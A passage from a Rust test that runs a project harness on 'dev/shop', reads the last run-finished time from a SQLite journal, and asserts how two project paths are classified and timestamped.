    h.checkout("dev/shop");
    h.run(&[]);
    let ended: i64 = rusqlite::Connection::open(h.store())
        .unwrap()
        .query_row(
            "SELECT MAX(at) FROM journal WHERE entry = 'run_finished'",
            [],
            |r| r.get(0),
        )
        .unwrap();
    for asked in ["~/dev/shop", "~/dev/ghost"] {
        let k = h.known(asked);
        assert_eq!(k.question(), v1::Question::Project, "{asked}");
        assert!(k.same_as.is_empty());
        assert_eq!(k.latest_run_at, Some(ended));
    }
}
